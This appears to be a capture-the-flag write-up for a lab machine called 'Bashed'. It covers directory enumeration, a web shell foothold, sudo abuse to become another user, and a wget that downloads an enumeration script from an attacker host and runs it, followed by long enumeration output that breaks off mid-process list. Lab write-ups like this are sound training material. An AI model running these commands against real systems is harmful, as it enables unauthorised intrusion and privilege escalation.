# Bashed

## Enumeration
### Nmap
Only http/80

Probably PHP

### Gobuster
```
$ gobuster dir -k -w /opt/wordlists/big.txt -u http://bashed.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bashed.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/10 11:33:27 Starting gobuster in directory enumeration mode
===============================================================
//                    (Status: 200) [Size: 7743]
/css                  (Status: 301) [Size: 306] [--> http://bashed.htb/css/]
/dev                  (Status: 301) [Size: 306] [--> http://bashed.htb/dev/]
/fonts                (Status: 301) [Size: 308] [--> http://bashed.htb/fonts/]
/images               (Status: 301) [Size: 309] [--> http://bashed.htb/images/]
/js                   (Status: 301) [Size: 305] [--> http://bashed.htb/js/]
/php                  (Status: 301) [Size: 306] [--> http://bashed.htb/php/]
/uploads              (Status: 301) [Size: 310] [--> http://bashed.htb/uploads/]

===============================================================
2022/11/10 11:33:40 Finished
===============================================================
```

### Http
Searchbar

#### POST /php/sendMail.php
Parameters:
```
'action': 'SendMessage',
'name': jQuery('#name').val(),
'email': jQuery('#contact-email').val(),
'subject': jQuery('#subject').val(),
'message': jQuery('#message').val()
```

#### GET /dev/phpbash.php
[USER] foothold found

## User
[FLAG]
```
cat /home/arrexel/user.txt
f57a5a4d7fa63672e684ee12db0ec7b3
```

## Priv esc
```
www-data $ sudo -l
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

`/scripts` is owned by scriptmanager

```
www-data $ ls -alh /scripts

ls: cannot access '/scripts/..': Permission denied
ls: cannot access '/scripts/test.py': Permission denied
ls: cannot access '/scripts/test.txt': Permission denied
ls: cannot access '/scripts/.': Permission denied
total 0
d????????? ? ? ? ? ? .
d????????? ? ? ? ? ? ..
-????????? ? ? ? ? ? test.py
-????????? ? ? ? ? ? test.txt
```

```
www-data $ sudo -u scriptmanager cat /scripts/test.txt
testing 123!
```

```
www-data $ sudo -u scriptmanager cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

```
www-data $ sudo -u scriptmanager ls -alh /scripts/

total 16K
drwxrwxr-- 2 scriptmanager scriptmanager 4.0K Jun 2 07:19 .
drwxr-xr-x 23 root root 4.0K Jun 2 07:25 ..
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py
-rw-r--r-- 1 root root 12 Nov 10 02:58 test.txt
```

```
www-data $ echo '/bin/bash' | sudo -u scriptmanager tee -a /scripts/bash
```

```
www-data $ sudo -u scriptmanager chmod 777 /scripts/bash
```

```
scriptmanager $ uname -a
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

###
LinEnum.sh
```
'unknown': unknown terminal type.
  _      _       ______
 | |    (_)     |  ____|
 | |     _ _ __ | |__   ___  ___
 | |    | | '_ \|  __| / __|/ __|
 | |____| | | | | |____\__ \ (__
 |______|_|_| |_|______|___/\___|

A script designed to aid the process of escilating user privalage to root

 Current User :  scriptmanager
 uid/gid/group:	 uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
 System  Info :  Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 Distribution :  Ubuntu 16.04.2 LTS \n \l
 Hostname     :	 bashed

  Current user has no sudo access

 uid files found
-rwsr-xr-x 1 root root        30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root        40152 Dec 16  2016 /bin/mount
-rwsr-xr-x 1 root root       142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root        44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root        44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root        40128 Mar 29  2016 /bin/su
-rwsr-xr-x 1 root root        27608 Dec 16  2016 /bin/umount
-rwsr-xr-x 1 root root        49584 Mar 29  2016 /usr/bin/chfn
-rwsr-xr-x 1 root root        40432 Mar 29  2016 /usr/bin/chsh
-rwsr-xr-x 1 root root        75304 Mar 29  2016 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        39904 Mar 29  2016 /usr/bin/newgrp
-rwsr-xr-x 1 root root        54256 Mar 29  2016 /usr/bin/passwd
-rwsr-xr-x 1 root root       136808 Jan 20  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root        10624 Feb  9  2017 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus  42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root       428240 Aug 11  2016 /usr/lib/openssh/ssh-keysign

 world writable & executable files found
/scripts/touchtest
/scripts/bash
/home/scriptmanager/linEsc.sh
/home/scriptmanager/pwn
/sys/fs/cgroup/memory/cgroup.event_control
/sys/kernel/security/apparmor/policy/.remove
/sys/kernel/security/apparmor/policy/.replace
/sys/kernel/security/apparmor/policy/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.ns_name
/sys/kernel/security/apparmor/.ns_level
/sys/kernel/security/apparmor/.ns_stacked
/sys/kernel/security/apparmor/.stacked
/sys/kernel/security/apparmor/.access
/var/www/html/uploads/index.html
/tmp/bash

scriptmanager@bashed:~$ /tmp/bash
/tmp/bash
scriptmanager@bashed:~$ wget 10.10.16.3:8000/LinEnum.sh
wget 10.10.16.3:8000/LinEnum.sh
--2022-11-10 07:01:29--  http://10.10.16.3:8000/LinEnum.sh
Connecting to 10.10.16.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46632 (46K) [application/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.09s

2022-11-10 07:01:29 (520 KB/s) - 'LinEnum.sh' saved [46632/46632]

scriptmanager@bashed:~$ bash LinEnum.sh
bash LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Thu Nov 10 07:01:37 PST 2022


### SYSTEM ##############################################
[-] Kernel information:
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


[-] Hostname:
bashed


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
arrexel          tty1                      Sat Dec 23 20:20:46 -0800 2017


[-] Who else is logged on:
 07:01:37 up  4:53,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)


[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash


[-] Super user account(s):
root


[-] Accounts that have recently used sudo:
/home/arrexel/.sudo_as_admin_successful


[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root          root          4.0K Dec  4  2017 .
drwxr-xr-x 23 root          root          4.0K Jun  2 07:25 ..
drwxr-xr-x  4 arrexel       arrexel       4.0K Jun  2 07:18 arrexel
drwxr-xr-x  3 scriptmanager scriptmanager 4.0K Nov 10 07:01 scriptmanager


### ENVIRONMENTAL #######################################
[-] Environment information:
TERM=unknown
SHELL=/bin/bash
USER=scriptmanager
SUDO_USER=www-data
SUDO_UID=33
USERNAME=scriptmanager
MAIL=/var/mail/scriptmanager
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
PWD=/home/scriptmanager
LANG=C
HOME=/home/scriptmanager
SUDO_COMMAND=/scripts/bash
SHLVL=4
LANGUAGE=en_US:
LOGNAME=scriptmanager
LESSOPEN=| /usr/bin/lesspipe %s
SUDO_GID=33
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


ls: cannot access '/snap/bin': No such file or directory
[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
drwxr-xr-x 2 root root  4096 Jun  2 07:19 /bin
drwxr-xr-x 2 root root  4096 Dec  4  2017 /sbin
drwxr-xr-x 2 root root 20480 Dec  4  2017 /usr/bin
drwxr-xr-x 2 root root  4096 Feb 15  2017 /usr/local/bin
drwxr-xr-x 2 root root  4096 Feb 15  2017 /usr/local/sbin
drwxr-xr-x 2 root root  4096 Dec  4  2017 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Jun  2 07:19 .
drwxr-xr-x 89 root root 4096 Jun  2 07:25 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  191 Dec  4  2017 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Jun  2 07:19 .
drwxr-xr-x 89 root root 4096 Jun  2 07:25 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  435 Nov 17  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun  2 07:19 .
drwxr-xr-x 89 root root 4096 Jun  2 07:25 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jun  2 07:19 .
drwxr-xr-x 89 root root 4096 Jun  2 07:25 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Jun  2 07:19 .
drwxr-xr-x 89 root root 4096 Jun  2 07:25 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Anything interesting in /var/spool/cron/crontabs:
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
-????????? ? ? ? ?            ? root


[-] Systemd timers:
NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Thu 2022-11-10 23:21:53 PST  16h left Thu 2022-11-10 06:44:32 PST  17min ago    apt-daily.timer              apt-daily.service
Fri 2022-11-11 02:22:46 PST  19h left Thu 2022-11-10 02:22:46 PST  4h 38min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

2 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
ens33     Link encap:Ethernet  HWaddr 00:50:56:b9:ba:c7
          inet addr:10.10.10.68  Bcast:10.10.10.255  Mask:255.255.255.255
          inet6 addr: fe80::250:56ff:feb9:bac7/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:bac7/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:14071 errors:0 dropped:89 overruns:0 frame:0
          TX packets:12798 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:1750670 (1.7 MB)  TX bytes:9452214 (9.4 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:93560 errors:0 dropped:0 overruns:0 frame:0
          TX packets:93560 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:6925872 (6.9 MB)  TX bytes:6925872 (6.9 MB)


[-] ARP history:
? (10.10.10.2) at 00:50:56:b9:f1:6b [ether] on ens33


[-] Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens33


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp6       0      0 :::80                   :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name


### SERVICES #############################################
[-] Running processes:
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.5  37824  5828 ?        Ss   02:07   0:01 /sbin/init noprompt
root          2  0.0  0.0      0     0 ?        S    02:07   0:00 [kthreadd]
root          3  0.0  0.0      0     0 ?        S    02:07   0:00 [ksoftirqd/0]
root          5  0.0  0.0      0     0 ?        S<   02:07   0:00 [kworker/0:0H]
root          7  0.0  0.0      0     0 ?        S    02:07   0:00 [rcu_sched]
root          8  0.0  0.0      0     0 ?        S    02:07   0:00 [rcu_bh]
root          9  0.0  0.0      0     0 ?        S    02:07   0:00 [migration/0]
root         10  0.0  0.0      0     0 ?        S    02:07   0:00 [watchdog/0]
root         11  0.0  0.0      0     0 ?        S    02:07   0:00 [kdevtmpfs]
root         12  0.0  0.0      0     0 ?        S<   02:07   0:00 [netns]
root         13  0.0  0.0      0     0 ?        S<   02:07   0:00 [perf]
root         14  0.0  0.0      0     0 ?        S    02:07   0:00 [khungtaskd]
root         15  0.0  0.0      0     0 ?        S<   02:07   0:00 [writeback]
root         16  0.0  0.0      0     0 ?        SN   02:07   0:00 [ksmd]
root         17  0.0  0.0      0     0 ?        SN   02:07   0:00 [khugepaged]
root         18  0.0  0.0      0     0 ?        S<   02:07   0:00 [crypto]
root         19  0.0  0.0      0     0 ?        S<   02:07   0:00 [kintegrityd]
root         20  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         21  0.0  0.0      0     0 ?        S<   02:07   0:00 [kblockd]
root         22  0.0  0.0      0     0 ?        S<   02:07   0:00 [ata_sff]
root         23  0.0  0.0      0     0 ?        S<   02:07   0:00 [md]
root         24  0.0  0.0      0     0 ?        S<   02:07   0:00 [devfreq_wq]
root         28  0.0  0.0      0     0 ?        S    02:07   0:00 [kswapd0]
root         29  0.0  0.0      0     0 ?        S<   02:07   0:00 [vmstat]
root         30  0.0  0.0      0     0 ?        S    02:07   0:00 [fsnotify_mark]
root         31  0.0  0.0      0     0 ?        S    02:07   0:00 [ecryptfs-kthrea]
root         47  0.0  0.0      0     0 ?        S<   02:07   0:00 [kthrotld]
root         48  0.0  0.0      0     0 ?        S<   02:07   0:00 [acpi_thermal_pm]
root         49  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         50  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         51  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         52  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         53  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         54  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         55  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         56  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         57  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         58  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         59  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         60  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         61  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         62  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         63  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         64  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         65  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         66  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         67  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         68  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         69  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         70  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         71  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         72  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root         73  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_0]
root         74  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_0]
root         75  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_1]
root         76  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_1]
root         83  0.0  0.0      0     0 ?        S<   02:07   0:00 [ipv6_addrconf]
root         96  0.0  0.0      0     0 ?        S<   02:07   0:00 [deferwq]
root         97  0.0  0.0      0     0 ?        S<   02:07   0:00 [charger_manager]
root        154  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_2]
root        155  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_2]
root        156  0.0  0.0      0     0 ?        S<   02:07   0:00 [vmw_pvscsi_wq_2]
root        158  0.0  0.0      0     0 ?        S<   02:07   0:00 [bioset]
root        173  0.0  0.0      0     0 ?        S<   02:07   0:00 [kpsmoused]
root        174  0.0  0.0      0     0 ?        S<   02:07   0:00 [ttm_swap]
root        176  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_3]
root        177  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_3]
root        178  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_4]
root        179  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_4]
root        180  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_5]
root        181  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_5]
root        182  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_6]
root        183  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_6]
root        184  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_7]
root        185  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_7]
root        186  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_8]
root        187  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_8]
root        188  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_9]
root        189  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_9]
root        190  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_10]
root        191  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_10]
root        192  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_11]
root        193  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_11]
root        194  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_12]
root        195  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_12]
root        196  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_13]
root        197  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_13]
root        198  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_14]
root        199  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_14]
root        200  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_15]
root        201  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_15]
root        202  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_16]
root        203  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_16]
root        204  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_17]
root        205  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_17]
root        206  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_18]
root        207  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_18]
root        208  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_19]
root        209  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_19]
root        210  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_20]
root        211  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_20]
root        212  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_21]
root        213  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_21]
root        214  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_22]
root        215  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_22]
root        216  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_23]
root        217  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_23]
root        218  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_24]
root        219  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_24]
root        220  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_25]
root        221  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_25]
root        222  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_26]
root        223  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_26]
root        224  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_27]
root        225  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_27]
root        226  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_28]
root        227  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_28]
root        228  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_29]
root        229  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_29]
root        230  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_30]
root        231  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_30]
root        232  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_31]
root        233  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_31]
root        234  0.0  0.0      0     0 ?        S    02:07   0:00 [scsi_eh_32]
root        235  0.0  0.0      0     0 ?        S<   02:07   0:00 [scsi_tmf_32]
root        260  0.0  0.0      0     0 ?        S    02:07   0:00 [kworker/u256:28]
root        261  0.0  0.0      0     0 ?        S    02:07   0:00 [kworker/u256:29]
root        286  0.0  0.0      0     0 ?        S    02:07   0:00 [jbd2/sda1-8]
root        287  0.0  0.0      0     0 ?        S<   02:07   0:00 [ext4-rsv-conver]
root        324  0.0  0.0      0     0 ?        S<   02:07   0:00 [kworker/0:1H]
root        326  0.0  0.2  28332  2712 ?        Ss   02:07   0:00 /lib/systemd/systemd-journald
root        347  0.0  0.0      0     0 ?        S    02:07   0:00 [kauditd]
root        356  0.0  0.0 158624   280 ?        Ssl  02:07   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root        386  0.0  0.3  44260  3788 ?        Ss   02:07   0:00 /lib/systemd/systemd-udevd
systemd+    521  0.0  0.2 100324  2500 ?        Ssl  02:07   0:00 /lib/systemd/systemd-timesyncd
syslog      616  0.0  0.3 256396  3164 ?        Ssl  02:07   0:00 /usr/sbin/rsyslogd -n
